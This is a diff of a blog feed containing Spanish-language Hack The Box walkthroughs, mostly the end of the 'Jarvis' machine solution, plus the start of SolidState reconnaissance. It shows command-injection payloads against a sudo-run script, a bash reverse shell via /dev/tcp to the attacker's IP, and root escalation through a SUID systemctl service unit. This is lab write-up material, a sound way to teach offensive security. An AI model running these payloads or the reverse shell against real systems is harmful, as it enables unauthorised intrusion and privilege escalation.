+www-data@jarvis:/var/www/html/images&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que podemos ejecutar el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/Admin-Utilities/simpler.py&lt;/code&gt; como el usuario &lt;strong&gt;pepper&lt;/strong&gt;. Si checamos, tenemos permisos de lectura y una de las opciones que ya nos debería llamar la atención sería el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt;, el cual nos permitiría ejecutar comandos a nivel de sistema como el usuario &lt;strong&gt;pepper&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@jarvis:/var/www/html/images&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; pepper /var/www/Admin-Utilities/simpler.py
+&lt;span class=&quot;k&quot;&gt;***********************************************&lt;/span&gt;
+     _                 _                       
+ ___&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | &lt;span class=&quot;s1&quot;&gt;'_ ` _ \| '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'__| '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; | | |
+&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | | | | | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |  __/ |_ | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |_| |
+|___/_|_| |_| |_| .__/|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| .__/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+&lt;span class=&quot;k&quot;&gt;***********************************************&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Simpler   -   A simple simplifier &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Version 1.0                                          &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+Usage:  python3 simpler.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;options]
+
+Options:
+    &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;/--help   : This &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;          : Statistics
+    &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;          : List the attackers IP
+    &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;          : ping an attacker IP
+    
+www-data@jarvis:/var/www/html/images&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podríamos tratar de ejecutar las siguientes opciones:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;10.10.14.27; whoami&lt;/li&gt;
+  &lt;li&gt;10.10.14.27 &amp;amp;&amp;amp; whoami&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;loquesea&lt;/td&gt;
+          &lt;td&gt; &lt;/td&gt;
+          &lt;td&gt;whoami&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;$(whoami)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;El último comando no nos muestra nada y para los anteriores se tiene el mensaje &lt;strong&gt;&lt;em&gt;Got you&lt;/em&gt;&lt;/strong&gt;; por lo que es posible que se esté ejecutando; así que vamos a crear un archivo en bash bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; que nos entable una reverse shell a nuestra máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;shell.sh 
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.27/443 0&amp;gt;&amp;amp;1
+www-data@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x shell.sh 
+www-data@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 4
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data 54 Dec 31 23:26 shell.sh
+www-data@jarvis:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y ahora vamos a ejecutar el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;simpler.py&lt;/code&gt; indicanle que queremos ejecutar un comando a nivel de sistema; además nos ponemos en escucha por el puerto 443.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; pepper /var/www/Admin-Utilities/simpler.py &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;***********************************************&lt;/span&gt;
+     _                 _                       
+ ___&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | &lt;span class=&quot;s1&quot;&gt;'_ ` _ \| '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'__| '&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; | | |
+&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | | | | | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |  __/ |_ | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |_| |
+|___/_|_| |_| |_| .__/|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| .__/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+&lt;span class=&quot;k&quot;&gt;***********************************************&lt;/span&gt;
+
+Enter an IP: &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;bash /dev/shm/shell.sh&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.143] 39848
+pepper@jarvis:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;pepper
+pepper@jarvis:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;pepper&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora nos falta convertirnos en el usuario &lt;strong&gt;root&lt;/strong&gt;; pero antes, vamos a hacer nuestro &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; para trabajar mejor. Enumeraremos un poco el sitema a ver que hay:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pepper&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pepper&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pepper&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;pepper: 
+pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+pepper@jarvis:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+./bin/fusermount
+./bin/mount
+./bin/ping
+./bin/systemctl
+./bin/umount
+./bin/su
+./usr/bin/newgrp
+./usr/bin/passwd
+./usr/bin/gpasswd
+./usr/bin/chsh
+./usr/bin/sudo
+./usr/bin/chfn
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+pepper@jarvis:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/systemctl&lt;/code&gt; tiene permisos SUID, por lo que podríamos ejecutarlo como el propietario del archivo, en este caso &lt;strong&gt;root&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pepper@jarvis:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/systemctl
+&lt;span class=&quot;nt&quot;&gt;-rwsr-x---&lt;/span&gt; 1 root pepper 174520 Feb 17  2019 /bin/systemctl
+pepper@jarvis:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Asi que vamos a crearnos un servicio y en caso de no saber como, podríamos echarle un ojo al siguiente recurso &lt;a href=&quot;https://www.tecmint.com/create-new-service-units-in-systemd/&quot;&gt;Tecmint&lt;/a&gt;. Asi que en el directorio home del usuario &lt;strong&gt;pepper&lt;/strong&gt; vamos a crear un directorio y dentro el archivo que necesitamos en donde le indicamos que ejecute nuestra reverse shell en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm/&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pepper@jarvis:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/pepper/
+pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;privesc
+pepper@jarvis:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;privesc
+pepper@jarvis:~/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano privesc.service
+pepper@jarvis:~/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;privesc.service 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Unit]
+Description &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Privesc
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Service]
+&lt;span class=&quot;nv&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;oneshot
+ExecStart &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /dev/shm/shell.sh
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Install]
+WantedBy &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; multi-user.target
+pepper@jarvis:~/privesc&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora creamos un link de nuestro servicio y lo habilitamos, para esto ya debemos estar en escucha por el puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pepper@jarvis:~/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; /home/pepper/privesc/privesc.service 
+Created symlink /etc/systemd/system/privesc.service -&amp;gt; /home/pepper/privesc/privesc.service.
+pepper@jarvis:~/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; /home/pepper/privesc/privesc.service
+Created symlink /etc/systemd/system/multi-user.target.wants/privesc.service -&amp;gt; /home/pepper/privesc/privesc.service.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.143] 39850
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1216&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+root@jarvis:/# &lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;root
+root@jarvis:/# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos como el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="SQL" /><category term="SQLi" /><category term="Injection" /><category term="Web" /><summary type="html">Resolución de la máquina Jarvis en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box SecNotes</title><link href="http://localhost:4000/htb-secnotes/" rel="alternate" type="text/html" title="Hack The Box SecNotes" /><published>2021-12-26T00:00:00-06:00</published><updated>2021-12-26T00:00:00-06:00</updated><id>http://localhost:4000/htb-secnotes</id><content type="html" xml:base="http://localhost:4000/htb-secnotes/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/banner-secnotes.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;secnotes&quot;&gt;SecNotes&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.97.&lt;/p&gt;
@@ -4573,556 +5053,4 @@ whoami
 &lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
 
 c:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="FTP" /><category term="Arbitrary_File_ Upload" /><summary type="html">Resolución de la máquina Devel en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box SolidState</title><link href="http://localhost:4000/htb-solidstate/" rel="alternate" type="text/html" title="Hack The Box SolidState" /><published>2021-11-26T00:00:00-06:00</published><updated>2021-11-26T00:00:00-06:00</updated><id>http://localhost:4000/htb-solidstate</id><content type="html" xml:base="http://localhost:4000/htb-solidstate/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-solidstate/banner-solidstate.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;solidstate&quot;&gt;SolidState&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.51.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.51
-PING 10.10.10.51 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.51: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;138 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.51 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 138.454/138.454/138.454/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.51 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-19 22:15 CDT
-Initiating Ping Scan at 22:15
-Scanning 10.10.10.51 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 22:15, 0.24s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 22:15
-Scanning 10.10.10.51 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 110/tcp on 10.10.10.51
-Discovered open port 25/tcp on 10.10.10.51
-Discovered open port 80/tcp on 10.10.10.51
-Discovered open port 22/tcp on 10.10.10.51
-Discovered open port 4555/tcp on 10.10.10.51
-Discovered open port 119/tcp on 10.10.10.51
-Completed SYN Stealth Scan at 22:16, 41.11s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.51
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65529 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT     STATE SERVICE
-22/tcp   open  ssh
-25/tcp   open  smtp
-80/tcp   open  http
-110/tcp  open  pop3
-119/tcp  open  nntp
-4555/tcp open  rsip
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;41.50 seconds
-           Raw packets sent: 71008 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.124MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 70377 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.815MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬───────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼───────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.51
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,25,80,110,119,4555
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,25,80,110,119,4555 10.10.10.51 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-19 22:26 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.51
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
